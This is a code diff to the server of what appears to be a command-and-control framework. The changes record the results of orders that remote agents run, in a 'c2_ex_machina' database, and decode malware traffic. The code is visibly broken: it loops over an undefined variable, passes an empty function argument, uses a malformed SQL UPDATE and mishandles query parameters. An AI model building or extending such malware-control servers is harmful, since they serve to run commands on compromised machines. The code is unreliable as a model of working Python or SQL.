@@ -72,7 +72,7 @@ Task = namedtuple('Task', [
     'after',
 ])
 
-def save_orders_results():
+def save_orders_results(result: Dict[str, Union[str, int]], hostname: str, key: str) -> None:
     """
     This function performs SQL requests to store
     order results in C2 database.
@@ -81,7 +81,7 @@ def save_orders_results():
     connection = connect(join(environ["WEBSCRIPTS_DATA_PATH"], "c2_ex_machina.db"))
     cursor = connection.cursor()
     for result in resuls:
-        cursor.execute('INSERT INTO "OrderResult" ("data","error","exitcode","requestDate","responseDate","startDate","endDate","agent","instance") VALUES (?, ?, ?, ?, ?, ?, ?, (SELECT ), ?);', result["Stdout"], result["Stderr"], result["Id"])
+        cursor.execute('UPDATE "OrderResult" SET ("data", "error", "exitcode", "responseDate", "startDate", "endDate") FROM (?, ?, ?, ?, ?, ?) WHERE ("instance" = ? AND "agent" = (SELECT "id" FROM "Agent" WHERE "name"=? AND "key"=?) AND "responseDate" IS NULL);', result["Stdout"], result["Stderr"], result["Status"], datetime.now(), datetime.fromtimestamp(result["StartTime"]), datetime.fromtimestamp(result["EndTime"]), result["Id"], hostname, key)
     cursor.close()
     connection.close()
 
@@ -175,7 +175,8 @@ def order(
             b"",
         )
 
-    data = get_orders(environ, logger, getattr(server.configuration, "c2_next_request_time", 300), agent_id, user_agent_split[-1], user_agent_split[2].strip("()").title())
+    hostname = user_agent_split[-1]
+    data = get_orders(environ, logger, getattr(server.configuration, "c2_next_request_time", 300), agent_id, , user_agent_split[2].strip("()").title())
     if data is None:
         return (
             "403",
@@ -184,7 +185,23 @@ def order(
         )
 
     if arguments:
-        save_orders_results(arguments if is_agent else malware_decode(arguments))
+        for key in (
+            "Id",
+            "Stdout",
+            "Stderr",
+            "Status",
+            "StartTime",
+            'EndTime',
+        ):
+            if arguments.get(key) is None:
+                logger.error('There is a key missing in the agent response: ' + key)
+                return (
+                    '400',
+                    {},
+                    (),
+                )
+        logger.debug('Save a new order result for agent ' + hostname)
+        save_orders_results(arguments if is_agent else malware_decode(arguments), hostname, agent_id)
 
     return (
         "200 OK",
